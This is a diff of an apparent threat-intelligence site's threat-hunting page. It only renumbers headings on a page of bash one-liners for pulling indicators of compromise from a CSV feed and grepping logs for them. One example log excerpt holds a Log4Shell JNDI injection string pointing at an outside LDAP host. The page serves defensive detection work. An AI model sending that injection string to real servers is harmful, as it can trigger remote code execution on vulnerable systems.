@@ -156,10 +156,10 @@
 					<li><a href="hunt.html#microsoftHunt" style="font-family: 'Segoe UI', Arial, sans-serif;color: #0000EE;font-weight: 600;">Microsoft Defender for Endpoint (MDE)</a></li>
 				</ol>
 				<hr style="border: 1px solid black;" id="bash"> <!-- DIVIDER -->
-				<h1 style="color: #737373;font-weight: 600;">1. Bash commands examples</h1>
+				<h1 style="color: #737373;font-weight: 600;">Bash commands examples</h1>
 				<!-- -->
 				<br>
-				<h5><b>1.1. Get raw IOCs by type</b> (url / domain / ip / sha256 / md5)</h5>
+				<h5><b>1. Get raw IOCs by type</b> (url / domain / ip / sha256 / md5)</h5>
 				Command:
 				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s <span style="color:gray;"><b>{CSV feed}</b></span> | awk -F, '$3 == "<span style="color:gray;"><b>{type}</b></span>"' | cut -d, -f4 > <span style="color:gray;"><b>{Output File}</b></span></pre>
 				Example:
@@ -172,7 +172,7 @@ url4
 ...</em></pre>
 				<!-- -->
 				<br>
-				<h5><b>1.2. Get raw IOCs by tag</b> (phishing / malware / CobaltStrike / Log4Shell / ...) <i style="font-size: 14px;" class="far fa-question-circle fa-sm align-self-center" data-toggle="tooltip" data-placement="top" title="All tags can be seen at 'About' section"></i></h5>
+				<h5><b>2. Get raw IOCs by tag</b> (phishing / malware / CobaltStrike / Log4Shell / ...) <i style="font-size: 14px;" class="far fa-question-circle fa-sm align-self-center" data-toggle="tooltip" data-placement="top" title="All tags can be seen at 'About' section"></i></h5>
 				Command:
 				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s <span style="color:gray;"><b>{CSV feed}</b></span> | awk -F, 'tolower($5) ~ "<span style="color:gray;"><b>{tag}</b></span>"' | cut -d, -f4 > <span style="color:gray;"><b>{Output File}</b></span></pre>
 				Example:
@@ -186,7 +186,7 @@ sha256
 ...</em></pre>
 				<!-- -->
 				<br>
-				<h5><b>1.3. Search IOCs in a file</b> (e.g. log files)</h5>
+				<h5><b>3. Search IOCs in a file</b> (e.g. log files)</h5>
 				Command:
 				<pre style="border: 1px solid black;color:black;font-size: 14px;background-color: #DEDEDE;" class="p-2">curl -s <span style="color:gray;"><b>{CSV feed}</b></span> | awk -F, '$3 == "<span style="color:gray;"><b>{type}</b></span>"' | cut -d, -f4 | while read line; do grep "$line" <span style="color:gray;"><b>{File}</b></span>;done</pre>
 				Example:
@@ -197,7 +197,7 @@ sha256
 170.210.45.163 - - [17/Dec/2021:01:48:06 +0000] "GET /${jndi:ldap://<span style="color:red;">31.131.16.127</span>:1389/Exploit} HTTP/1.1" 301 5228 "-" "Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefox"
 170.210.45.163 - - [17/Dec/2021:01:48:07 +0000] "GET / HTTP/1.1" 301 5228 "-" "${jndi:ldap://<span style="color:red;">31.131.16.127</span>:1389/Exploit}"</em></pre>
 				<hr style="border: 1px solid black;" id="microsoftHunt"> <!-- DIVIDER -->
-				<h1 style="font-family: 'Segoe UI', Arial, sans-serif;color: #737373;font-weight: 600;">2. Microsoft Defender for Endpoint (MDE) <a style="background-color: 
+				<h1 style="font-family: 'Segoe UI', Arial, sans-serif;color: #737373;font-weight: 600;">Microsoft Defender for Endpoint (MDE) <a style="background-color: 
 #00a1f1;border-color: black;font-size: 12px;" class="btn btn-primary btn-sm" href="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/advanced-hunting-overview?view=o365-worldwide" target="_blank" role="button">More info <i class="fas fa-external-link-alt"></i></a></h1>
 				<p style="color: #737373;font-size: 16px;font-family: 'Rubik', sans-serif;">Some templates, modify them as you wish.</p>
 				<br>
